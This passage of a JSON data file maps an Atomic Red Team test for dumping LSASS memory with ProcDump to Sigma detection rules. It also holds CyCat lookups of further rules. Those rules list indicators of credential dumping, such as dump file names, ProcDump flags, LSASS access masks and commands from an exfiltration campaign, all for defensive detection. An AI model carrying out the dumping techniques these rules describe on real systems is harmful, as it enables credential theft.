                        "remote_content": "title: Use Short Name Path in Command Line\nid: 349d891d-fef0-4fe4-bc53-eee623a15969\nrelated:\n    - id: a96970af-f126-420d-90e1-d37bf25e50e1\n      type: similar\nstatus: test\ndescription: Detect use of the Windows 8.3 short name. Which could be used as a method to avoid command-line detection\nreferences:\n    - https://www.acunetix.com/blog/articles/windows-short-8-3-filenames-web-security-problem/\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc959352(v=technet.10)\n    - https://twitter.com/frack113/status/1555830623633375232\nauthor: frack113, Nasreddine Bencherchali\ndate: 2022-08-07\nmodified: 2022-10-26\ntags:\n    - attack.defense-evasion\n    - attack.t1564.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '~1\\'\n            - '~2\\'\n    filter:\n        - ParentImage:\n              - 'C:\\Windows\\System32\\Dism.exe'\n              - 'C:\\Windows\\System32\\cleanmgr.exe'\n              - 'C:\\Program Files\\GPSoftware\\Directory Opus\\dopus.exe'\n        - ParentImage|endswith:\n              - '\\WebEx\\WebexHost.exe'\n              - '\\thor\\thor64.exe'\n              - '\\veam.backup.shell.exe'\n              - '\\winget.exe'\n              - '\\Everything\\Everything.exe'\n        - ParentImage|contains: '\\AppData\\Local\\Temp\\WinGet\\'\n        - CommandLine|contains:\n              - '\\appdata\\local\\webex\\webex64\\meetings\\wbxreport.exe'\n              - 'C:\\Program Files\\Git\\post-install.bat'\n              - 'C:\\Program Files\\Git\\cmd\\scalar.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Applications could use this notation occasionally which might generate some false positives. In that case investigate the parent and child process.\nlevel: medium\n"
                    }
                ]
            },
            {
                "tech_id": "T1003.001",
                "atomic_attack_guid": "0be2230c-9ab3-4ac2-8826-3199b9a0ebf8",
                "atomic_attack_name": "Dump LSASS.exe Memory using ProcDump",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Renamed ProcDump Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_renamed_sysinternals_procdump.yml",
                        "remote_content": "title: Renamed ProcDump Execution\nid: 4a0b2c7e-7cb2-495d-8b63-5f268e7bfd67\nrelated:\n    - id: 03795938-1387-481b-9f4c-3f6241e604fe\n      type: obsolete\nstatus: test\ndescription: |\n    Detects the execution of a renamed ProcDump executable.\n    This often done by attackers or malware in order to evade defensive mechanisms.\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/procdump\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-11-18\nmodified: 2024-06-25\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_ofn:\n        OriginalFileName: 'procdump'\n    selection_cli_dump_flag:\n        CommandLine|contains|windash:\n            - ' -ma ' # Full Dump\n            - ' -mp ' # Mini Plus\n    selection_cli_eula_flag:\n        # Note: Even though the \"accepteula\" flag isn't required. We add it to avoid collision with similar utilities.\n        CommandLine|contains|windash: ' /accepteula'\n    filter_main_known_names:\n        Image|endswith:\n            - '\\procdump.exe'\n            - '\\procdump64.exe'\n    condition: (selection_ofn or all of selection_cli_*) and not 1 of filter_main_*\nfalsepositives:\n    - Procdump illegally bundled with legitimate software.\n    - Administrators who rename binaries (should be investigated).\nlevel: high\n"
                    },
                    {
                        "rule_name": "LSASS Dump Keyword In CommandLine",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_lsass_dmp_cli_keywords.yml",
                        "remote_content": "title: LSASS Dump Keyword In CommandLine\nid: ffa6861c-4461-4f59-8a41-578c39f3f23e\nrelated:\n    - id: a5a2d357-1ab8-4675-a967-ef9990a59391\n      type: derived\nstatus: test\ndescription: |\n    Detects the presence of the keywords \"lsass\" and \".dmp\" in the commandline, which could indicate a potential attempt to dump or create a dump of the lsass process.\nreferences:\n    - https://github.com/Hackndo/lsassy\n    - https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf\n    - https://github.com/elastic/detection-rules/blob/c76a39796972ecde44cb1da6df47f1b6562c9770/rules/windows/credential_access_lsass_memdump_file_created.toml\n    - https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/\n    - https://github.com/helpsystems/nanodump\n    - https://github.com/CCob/MirrorDump\nauthor: E.M. Anhaus, Tony Lambert, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-10-24\nmodified: 2023-08-29\ntags:\n    - attack.credential-access\n    - attack.t1003.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - CommandLine|contains:\n              - 'lsass.dmp'\n              - 'lsass.zip'\n              - 'lsass.rar'\n              - 'Andrew.dmp'\n              - 'Coredump.dmp'\n              - 'NotLSASS.zip'  # https://github.com/CCob/MirrorDump\n              - 'lsass_2'  # default format of procdump v9.0 is lsass_YYMMDD_HHmmss.dmp\n              - 'lsassdump'\n              - 'lsassdmp'\n        - CommandLine|contains|all:\n              - 'lsass'\n              - '.dmp'\n        - CommandLine|contains|all:\n              - 'SQLDmpr'\n              - '.mdmp'\n        - CommandLine|contains|all:\n              - 'nanodump'\n              - '.dmp'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n"
                    },
                    {
                        "rule_name": "Potential LSASS Process Dump Via Procdump",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_sysinternals_procdump_lsass.yml",
                        "remote_content": "title: Potential LSASS Process Dump Via Procdump\nid: 5afee48e-67dd-4e03-a783-f74259dcf998\nstatus: stable\ndescription: |\n    Detects suspicious uses of the SysInternals Procdump utility by using a special command line parameter in combination with the lsass.exe process.\n    This way we are also able to catch cases in which the attacker has renamed the procdump executable.\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/procdump\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-10-30\nmodified: 2024-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.credential-access\n    - attack.t1003.001\n    - car.2013-05-009\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_flags:\n        CommandLine|contains|windash: ' -ma '\n    selection_process:\n        CommandLine|contains: ' ls' # Short for lsass\n    condition: all of selection*\nfalsepositives:\n    - Unlikely, because no one should dump an lsass process memory\n    - Another tool that uses command line flags similar to ProcDump\nlevel: high\n"
                    },
                    {
                        "rule_name": "Potential Execution of Sysinternals Tools",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_sysinternals_eula_accepted.yml",
                        "remote_content": "title: Potential Execution of Sysinternals Tools\nid: 7cccd811-7ae9-4ebe-9afd-cb5c406b824b\nrelated:\n    - id: 25ffa65d-76d8-4da5-a832-3f2b0136e133\n      type: derived\nstatus: test\ndescription: Detects command lines that contain the 'accepteula' flag which could be a sign of execution of one of the Sysinternals tools\nreferences:\n    - https://twitter.com/Moti_B/status/1008587936735035392\nauthor: Markus Neis\ndate: 2017-08-28\nmodified: 2024-03-13\ntags:\n    - attack.resource-development\n    - attack.t1588.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|windash: ' -accepteula'\n    condition: selection\nfalsepositives:\n    - Legitimate use of SysInternals tools\n    - Programs that use the same command line flag\nlevel: low\n"
                    },
                    {
                        "rule_name": "Procdump Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_sysinternals_procdump.yml",
                        "remote_content": "title: Procdump Execution\nid: 2e65275c-8288-4ab4-aeb7-6274f58b6b20\nstatus: test\ndescription: Detects usage of the SysInternals Procdump utility\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/procdump\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-08-16\nmodified: 2023-02-28\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.t1003.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\procdump.exe'\n            - '\\procdump64.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of procdump by a developer or administrator\nlevel: medium\n"
                    }
                ]
            }
        ],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "0e277796-5f23-4e49-a490-483131d4f6e1",
                    "6902955a-01b7-432c-b32a-6f5f81d8f625",
                    "aa1697b7-d611-4f9a-9cb2-5125b4ccfd5c",
                    "962fe167-e48d-4fd6-9974-11e5b9a5d6d1",
                    "c3e76af5-4ce0-4a14-9c9a-25ceb8fda182",
                    "f239b326-2f41-4d6b-9dfa-c846a60ef505",
                    "03795938-1387-481b-9f4c-3f6241e604fe",
                    "3f07b9d1-2082-4c56-9277-613a621983cc",
                    "03e2746e-2b31-42f1-ab7a-eb39365b2422",
                    "b1bd3a59-c1fd-4860-9f40-4dd161a7d1f5",
                    "a5a2d357-1ab8-4675-a967-ef9990a59391",
                    "5afee48e-67dd-4e03-a783-f74259dcf998",
                    "65f2d882-3f41-4d48-8a06-29af77ec9f90",
                    "a0a278fe-2c0e-4de2-ac3c-c68b08a9ba98",
                    "06d71506-7beb-4f22-8888-e2e5e2ca7fd8",
                    "55e29995-75e7-451a-bef0-6225e2f13597",
                    "4b9a8556-99c4-470b-a40c-9c8d02c77ed0",
                    "472159c5-31b9-4f56-b794-b766faa8b0a7",
                    "4976aa50-8f41-45c6-8b15-ab3fc10e79ed",
                    "961d0ba2-3eea-4303-a930-2cf78bbfcc5e",
                    "fa34b441-961a-42fa-a100-ecc28c886725",
                    "6355a919-2e97-4285-a673-74645566340d",
                    "5e3d3601-0662-4af0-b1d2-36a05e90c40a",
                    "646ea171-dded-4578-8a4d-65e9822892e3",
                    "f26307d8-14cd-47e3-a26b-4b4769f24af6",
                    "e5b33f7d-eb93-48b6-9851-09e1e610b6d7",
                    "1a1ed54a-2ba4-4221-94d5-01dee560d71e",
                    "2e69f167-47b5-4ae7-a390-47764529eff5",
                    "9a4ccd1a-3526-4d99-b980-9f9c5d3a6ff3",
                    "a18e0862-127b-43ca-be12-1a542c75c7c5",
                    "0f920ebe-7aea-4c54-b202-9aa0c609cfe5",
                    "678dfc63-fefb-47a5-a04c-26bcf8cc9f65",
                    "dee0a7a3-f200-4112-a99b-952196d81e42",
                    "e074832a-eada-4fd7-94a1-10642b130e16",
                    "2f869d59-7f6a-4931-992c-cce556ff2d53",
                    "c8da0dfd-4ed0-4b68-962d-13c9c884384e",
                    "79aeeb41-8156-4fac-a0cd-076495ab82a1",
                    "a49fa4d5-11db-418c-8473-1e014a8dd462",
                    "2e65275c-8288-4ab4-aeb7-6274f58b6b20",
                    "79b06761-465f-4f88-9ef2-150e24d3d737",
                    "5ef9853e-4d0e-4a70-846f-a9ca37d876da",
                    "33efc23c-6ea2-4503-8cfe-bdf82ce8f719",
                    "9bd012ee-0dff-44d7-84a0-aa698cfd87a3",
                    "2704ab9e-afe2-4854-a3b1-0c0706d03578",
                    "78cc2dd2-7d20-4d32-93ff-057084c38b93",
                    "ffa6861c-4461-4f59-8a41-578c39f3f23e",
                    "ca621ba5-54ab-4035-9942-d378e6fcde3c",
                    "4a1b6da0-d94f-4fc3-98fc-2d9cb9e5ee76",
                    "a642964e-bead-4bed-8910-1bb4d63e3b4d",
                    "b99a1518-1ad5-4f65-bc95-1ffff97a8fd0",
                    "a6b33c02-8305-488f-8585-03cb2a7763f2",
                    "515c8be5-e5df-4c5e-8f6d-a4a2f05e4b48",
                    "aa35a627-33fb-4d04-a165-d33b4afca3e8",
                    "66e563f9-1cbd-4a22-a957-d8b7c0f44372",
                    "4c0aaedc-154c-4427-ada0-d80ef9c9deb6",
                    "edadb1e5-5919-4e4c-8462-a9e643b02c4b",
                    "8fbf3271-1ef6-4e94-8210-03c2317947f6",
                    "df5ff0a5-f83f-4a5b-bba1-3e6a3f6f6ea2",
                    "910ab938-668b-401b-b08c-b596e80fdca5",
                    "eb1c4225-1c23-4241-8dd4-051389fde4ce",
                    "761270e6-3a97-4c18-9a44-a844cb5b562b",
                    "a18dd26b-6450-46de-8c91-9659150cf088",
                    "857c8db3-c89b-42fb-882b-f681c7cf4da2",
                    "e76c8240-d68f-4773-8880-5c6f63595aaf",
                    "23ceaf5c-b6f1-4a32-8559-f2ff734be516",
                    "93d94efc-d7ad-4161-ad7d-1638c4f908d8",
                    "9433ff9c-5d3f-4269-99f8-95fc826ea489",
                    "32d0d3e2-e58d-4d41-926b-18b520b2b32d",
                    "b1876533-4ed5-4a83-90f3-b8645840a413",
                    "129966c9-de17-4334-a123-8b58172e664d",
                    "8cde342c-ba48-4b74-b615-172c330f2e93",
                    "84c174ab-d3ef-481f-9c86-a50d0b8e3edb",
                    "7aa7009a-28b9-4344-8c1f-159489a390df",
                    "4be8b654-0c01-4c9d-a10c-6b28467fc651",
                    "7186e989-4ed7-4f4e-a656-4674b9e3e48b",
                    "f0d1feba-4344-4ca9-8121-a6c97bd6df52",
                    "09e6d5c0-05b8-4ff8-9eeb-043046ec774c",
                    "36d88494-1d43-4dc0-b3fa-35c8fea0ca9d",
                    "0b4ae027-2a2d-4b93-8c7e-962caaba5b2a",
                    "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
                    "fb656378-f909-47c1-8747-278bf09f4f4f"
                ],
                "lookup_results": [
                    {
                        "uuid": "0e277796-5f23-4e49-a490-483131d4f6e1",
                        "lookup_data": {
                            "description": "Detects the load of dbghelp/dbgcore DLL (used to make memory dumps) by suspicious processes.\nTools like ProcessHacker and some attacker tradecract use MiniDumpWriteDump API found in dbghelp.dll or dbgcore.dll.\nAs an example, SilentTrynity C2 Framework has a module that leverages this API to dump the contents of Lsass.exe and transfer it over the network back to the attacker's machine.\n",
                            "raw": "author: Perez Diego (@darkquassar), oscd.community, Ecco\ndate: 2019/10/27\ndescription: 'Detects the load of dbghelp/dbgcore DLL (used to make memory dumps)\n  by suspicious processes.\n\n  Tools like ProcessHacker and some attacker tradecract use MiniDumpWriteDump API\n  found in dbghelp.dll or dbgcore.dll.\n\n  As an example, SilentTrynity C2 Framework has a module that leverages this API to\n  dump the contents of Lsass.exe and transfer it over the network back to the attacker''s\n  machine.\n\n  '\ndetection:\n  condition: (signedprocess or unsignedprocess) and not 1 of filter*\n  filter1:\n  - Image|contains: Visual Studio\n  - CommandLine|contains:\n    - -k LocalSystemNetworkRestricted\n    - -k UnistackSvcGroup -s WpnUserService\n  filter2:\n    CommandLine:\n    - C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s wuauserv\n    - C:\\Windows\\System32\\svchost.exe -k WerSvcGroup\n  filter3:\n    CommandLine|endswith: \\TiWorker.exe -Embedding\n    CommandLine|startswith: C:\\WINDOWS\\winsxs\\\n  signedprocess:\n    ImageLoaded|endswith:\n    - \\dbghelp.dll\n    - \\dbgcore.dll\n    Image|endswith:\n    - \\msbuild.exe\n    - \\cmd.exe\n    - \\rundll32.exe\n    - \\word.exe\n    - \\excel.exe\n    - \\powerpnt.exe\n    - \\outlook.exe\n    - \\monitoringhost.exe\n    - \\wmic.exe\n    - \\bash.exe\n    - \\wscript.exe\n    - \\cscript.exe\n    - \\mshta.exe\n    - \\dnx.exe\n    - \\regsvcs.exe\n    - \\sc.exe\n    - \\scriptrunner.exe\n  unsignedprocess:\n    ImageLoaded|endswith:\n    - \\dbghelp.dll\n    - \\dbgcore.dll\n    Signed: 'false'\nfalsepositives:\n- Unknown\nfields:\n- ComputerName\n- User\n- Image\n- ImageLoaded\nid: 0e277796-5f23-4e49-a490-483131d4f6e1\nlevel: high\nlogsource:\n  category: image_load\n  product: windows\nmodified: 2022/12/09\nreferences:\n- https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump\n- https://www.pinvoke.net/default.aspx/dbghelp/MiniDumpWriteDump.html\n- https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: Load of dbghelp/dbgcore DLL from Suspicious Process\n",
                            "sigma:id": "0e277796-5f23-4e49-a490-483131d4f6e1",
                            "title": "Load of dbghelp/dbgcore DLL from Suspicious Process",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "6902955a-01b7-432c-b32a-6f5f81d8f625",
                        "lookup_data": {
                            "description": "Detects the presence of an LSASS dump file in the \"CrashDumps\" folder. This could be a sign of LSASS credential dumping. Techniques such as the LSASS Shtinkering have been seen abusing the Windows Error Reporting to dump said process.",
                            "raw": "author: '@pbssubhash'\ndate: 2022/12/08\ndescription: Detects the presence of an LSASS dump file in the \"CrashDumps\" folder.\n  This could be a sign of LSASS credential dumping. Techniques such as the LSASS Shtinkering\n  have been seen abusing the Windows Error Reporting to dump said process.\ndetection:\n  condition: selection\n  selection:\n    TargetFilename|contains: lsass.exe.\n    TargetFilename|endswith: .dmp\n    TargetFilename|startswith: C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\CrashDumps\\\nfalsepositives:\n- Rare legitimate dump of the process by the operating system due to a crash of lsass\nid: 6902955a-01b7-432c-b32a-6f5f81d8f625\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nreferences:\n- https://github.com/deepinstinct/Lsass-Shtinkering\n- https://media.defcon.org/DEF%20CON%2030/DEF%20CON%2030%20presentations/Asaf%20Gilboa%20-%20LSASS%20Shtinkering%20Abusing%20Windows%20Error%20Reporting%20to%20Dump%20LSASS.pdf\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: LSASS Process Dump Artefact In CrashDumps Folder\n",
                            "sigma:id": "6902955a-01b7-432c-b32a-6f5f81d8f625",
                            "title": "LSASS Process Dump Artefact In CrashDumps Folder",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "aa1697b7-d611-4f9a-9cb2-5125b4ccfd5c",
                        "lookup_data": {
                            "description": "Detects process handle on LSASS process with certain access mask and object type SAM_DOMAIN",
                            "raw": "author: sigma\ndate: 2017/02/12\ndescription: Detects process handle on LSASS process with certain access mask and\n  object type SAM_DOMAIN\ndetection:\n  condition: selection\n  selection:\n    AccessMask: '0x705'\n    EventID: 4656\n    ObjectType: SAM_DOMAIN\n    ProcessName|endswith: \\lsass.exe\nfalsepositives:\n- Unknown\nid: aa1697b7-d611-4f9a-9cb2-5125b4ccfd5c\nlevel: high\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/10/09\nreferences:\n- https://twitter.com/jackcr/status/807385668833968128\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: Password Dumper Activity on LSASS\n",
                            "sigma:id": "aa1697b7-d611-4f9a-9cb2-5125b4ccfd5c",
                            "title": "Password Dumper Activity on LSASS",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "962fe167-e48d-4fd6-9974-11e5b9a5d6d1",
                        "lookup_data": {
                            "description": "Detects potential mimikatz-like tools accessing LSASS from non system account",
                            "raw": "author: Roberto Rodriguez @Cyb3rWard0g\ndate: 2019/06/20\ndescription: Detects potential mimikatz-like tools accessing LSASS from non system\n  account\ndetection:\n  condition: selection and not 1 of filter*\n  filter1:\n    SubjectUserName|endswith: $\n  filter2:\n    ProcessName|startswith: C:\\Program Files\n  filter3:\n    AccessMask: '0x1410'\n    ProcessName: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\n  filter_games:\n    ProcessName|contains: \\SteamLibrary\\steamapps\\\n  selection:\n    AccessMask:\n    - '0x40'\n    - '0x1400'\n    - '0x100000'\n    - '0x1410'\n    - '0x1010'\n    - '0x1438'\n    - '0x143a'\n    - '0x1418'\n    - '0x1f0fff'\n    - '0x1f1fff'\n    - '0x1f2fff'\n    - '0x1f3fff'\n    - 40\n    - 1400\n    - 1000\n    - 100000\n    - 1410\n    - 1010\n    - 1438\n    - 143a\n    - 1418\n    - 1f0fff\n    - 1f1fff\n    - 1f2fff\n    - 1f3fff\n    EventID:\n    - 4663\n    - 4656\n    ObjectName|endswith: \\lsass.exe\n    ObjectType: Process\nfalsepositives:\n- Unknown\nfields:\n- ComputerName\n- ObjectName\n- SubjectUserName\n- ProcessName\nid: 962fe167-e48d-4fd6-9974-11e5b9a5d6d1\nlevel: high\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/11/13\nreferences:\n- https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-170105221010.html\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: LSASS Access from Non System Account\n",
                            "sigma:id": "962fe167-e48d-4fd6-9974-11e5b9a5d6d1",
                            "title": "LSASS Access from Non System Account",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "c3e76af5-4ce0-4a14-9c9a-25ceb8fda182",
                        "lookup_data": {
                            "description": "Detects WerFault creating a dump file with a name that indicates that the dump file could be an LSASS process memory, which contains user credentials",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/06/27\ndescription: Detects WerFault creating a dump file with a name that indicates that\n  the dump file could be an LSASS process memory, which contains user credentials\ndetection:\n  condition: selection\n  selection:\n    Image: C:\\WINDOWS\\system32\\WerFault.exe\n    TargetFilename|contains:\n    - \\lsass\n    - lsass.exe\nfalsepositives:\n- Unknown\nid: c3e76af5-4ce0-4a14-9c9a-25ceb8fda182\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nreferences:\n- https://github.com/helpsystems/nanodump\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: WerFault LSASS Process Memory Dump\n",
                            "sigma:id": "c3e76af5-4ce0-4a14-9c9a-25ceb8fda182",
                            "title": "WerFault LSASS Process Memory Dump",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f239b326-2f41-4d6b-9dfa-c846a60ef505",
                        "lookup_data": {
                            "description": "Detects password dumper activity by monitoring remote thread creation EventID 8 in combination with the lsass.exe process as TargetImage.\nThe process in field Process is the malicious program. A single execution can lead to hundreds of events.\n",
                            "raw": "author: Thomas Patzke\ndate: 2017/02/19\ndescription: 'Detects password dumper activity by monitoring remote thread creation\n  EventID 8 in combination with the lsass.exe process as TargetImage.\n\n  The process in field Process is the malicious program. A single execution can lead\n  to hundreds of events.\n\n  '\ndetection:\n  condition: selection\n  selection:\n    StartModule: ''\n    TargetImage|endswith: \\lsass.exe\nfalsepositives:\n- Antivirus products\nid: f239b326-2f41-4d6b-9dfa-c846a60ef505\nlevel: high\nlogsource:\n  category: create_remote_thread\n  product: windows\nmodified: 2021/06/21\nreferences:\n- https://jpcertcc.github.io/ToolAnalysisResultSheet/details/WCE.htm\nstatus: stable\ntags:\n- attack.credential_access\n- attack.s0005\n- attack.t1003.001\ntitle: Password Dumper Remote Thread in LSASS\n",
                            "sigma:id": "f239b326-2f41-4d6b-9dfa-c846a60ef505",
                            "title": "Password Dumper Remote Thread in LSASS",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "03795938-1387-481b-9f4c-3f6241e604fe",
                        "lookup_data": {
                            "description": "Detects suspicious uses of the SysInternals Procdump utility by using a special command line parameter ' -ma '. This way we're also able to catch cases in which the attacker has renamed the procdump executable.",
                            "raw": "author: Florian Roth\ndate: 2021/02/02\ndescription: Detects suspicious uses of the SysInternals Procdump utility by using\n  a special command line parameter ' -ma '. This way we're also able to catch cases\n  in which the attacker has renamed the procdump executable.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - ' -ma '\nfalsepositives:\n- Another tool that uses the command line switches of Procdump\n- Legitimate use of procdump by a developer or administrator\nid: 03795938-1387-481b-9f4c-3f6241e604fe\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- Internal Research\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1036\n- attack.t1003.001\ntitle: Suspicious Use of Procdump\n",
                            "sigma:id": "03795938-1387-481b-9f4c-3f6241e604fe",
                            "title": "Suspicious Use of Procdump",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "3f07b9d1-2082-4c56-9277-613a621983cc",
                        "lookup_data": {
                            "description": "Detects Accessing to lsass.exe by Powershell",
                            "raw": "author: oscd.community, Natalia Shornikova\ndate: 2020/10/06\ndescription: Detects Accessing to lsass.exe by Powershell\ndetection:\n  condition: selection\n  selection:\n    EventID:\n    - 8\n    - 10\n    SourceImage|endswith: \\powershell.exe\n    TargetImage|endswith: \\lsass.exe\nfalsepositives:\n- Unknown\nid: 3f07b9d1-2082-4c56-9277-613a621983cc\nlevel: high\nlogsource:\n  product: windows\n  service: sysmon\nmodified: 2021/05/24\nreferences:\n- https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: Accessing WinAPI in PowerShell for Credentials Dumping\n",
                            "sigma:id": "3f07b9d1-2082-4c56-9277-613a621983cc",
                            "title": "Accessing WinAPI in PowerShell for Credentials Dumping",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "03e2746e-2b31-42f1-ab7a-eb39365b2422",
                        "lookup_data": {
                            "description": "Detects Judgement Panda activity as described in Global Threat Report 2019 by Crowdstrike",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/02/21\ndescription: Detects Judgement Panda activity as described in Global Threat Report\n  2019 by Crowdstrike\ndetection:\n  condition: selection1 or selection2\n  selection1:\n  - CommandLine|endswith: eprod.ldf\n  - CommandLine|contains:\n    - '\\ldifde.exe -f -n '\n    - '\\7za.exe a 1.7z '\n    - \\aaaa\\procdump64.exe\n    - \\aaaa\\netsess.exe\n    - \\aaaa\\7za.exe\n    - copy .\\1.7z \\\n    - copy \\\\client\\c$\\aaaa\\\n  selection2:\n    Image: C:\\Users\\Public\\7za.exe\nfalsepositives:\n- Unknown\nid: 03e2746e-2b31-42f1-ab7a-eb39365b2422\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/\nstatus: test\ntags:\n- attack.lateral_movement\n- attack.g0010\n- attack.credential_access\n- attack.t1003.001\n- attack.exfiltration\n- attack.t1560.001\ntitle: Judgement Panda Exfil Activity\n",
                            "sigma:id": "03e2746e-2b31-42f1-ab7a-eb39365b2422",
                            "title": "Judgement Panda Exfil Activity",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b1bd3a59-c1fd-4860-9f40-4dd161a7d1f5",
                        "lookup_data": {
                            "description": "Detects HandleKatz opening LSASS to duplicate its handle to later dump the memory without opening any new handles",
                            "raw": "author: Bhabesh Raj (rule), @thefLinkk\ndate: 2022/06/27\ndescription: Detects HandleKatz opening LSASS to duplicate its handle to later dump\n  the memory without opening any new handles\ndetection:\n  call_trace:\n    CallTrace|contains: '|UNKNOWN('\n    CallTrace|endswith: )\n    CallTrace|startswith: C:\\Windows\\System32\\ntdll.dll+\n  condition: selection and call_trace\n  selection:\n    GrantedAccess: '0x1440'\n    TargetImage|endswith: \\lsass.exe\nfalsepositives:\n- Unknown\nid: b1bd3a59-c1fd-4860-9f40-4dd161a7d1f5\nlevel: high\nlogsource:\n  category: process_access\n  product: windows\nreferences:\n- https://github.com/codewhitesec/HandleKatz\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1106\n- attack.defense_evasion\n- attack.t1003.001\ntitle: HandleKatz Duplicating LSASS Handle\n",
                            "sigma:id": "b1bd3a59-c1fd-4860-9f40-4dd161a7d1f5",
                            "title": "HandleKatz Duplicating LSASS Handle",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a5a2d357-1ab8-4675-a967-ef9990a59391",
                        "lookup_data": {
                            "description": "Detects file names used by different memory dumping tools to create a memory dump of the LSASS process memory, which contains user credentials",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/11/15\ndescription: Detects file names used by different memory dumping tools to create a\n  memory dump of the LSASS process memory, which contains user credentials\ndetection:\n  condition: 1 of selection*\n  selection1:\n    TargetFilename|endswith:\n    - \\lsass.dmp\n    - \\lsass.zip\n    - \\lsass.rar\n    - \\Temp\\dumpert.dmp\n    - \\Andrew.dmp\n    - \\Coredump.dmp\n  selection2:\n    TargetFilename|contains:\n    - \\lsass_2\n    - \\lsassdump\n    - \\lsassdmp\n  selection3:\n    TargetFilename|contains|all:\n    - \\lsass\n    - .dmp\n  selection4:\n    TargetFilename|contains: SQLDmpr\n    TargetFilename|endswith: .mdmp\n  selection5:\n    TargetFilename|endswith: .dmp\n    TargetFilename|startswith: nanodump\nfalsepositives:\n- Unknown\nid: a5a2d357-1ab8-4675-a967-ef9990a59391\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/06/27\nreferences:\n- https://www.google.com/search?q=procdump+lsass\n- https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf\n- https://github.com/elastic/detection-rules/blob/c76a39796972ecde44cb1da6df47f1b6562c9770/rules/windows/credential_access_lsass_memdump_file_created.toml\n- https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/\n- https://github.com/helpsystems/nanodump\nrelated:\n- id: db2110f3-479d-42a6-94fb-d35bc1e46492\n  type: obsoletes\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: LSASS Process Memory Dump Files\n",
                            "sigma:id": "a5a2d357-1ab8-4675-a967-ef9990a59391",
                            "title": "LSASS Process Memory Dump Files",
                            "_cycat_type": "Item"
                        }
                    },
                    {
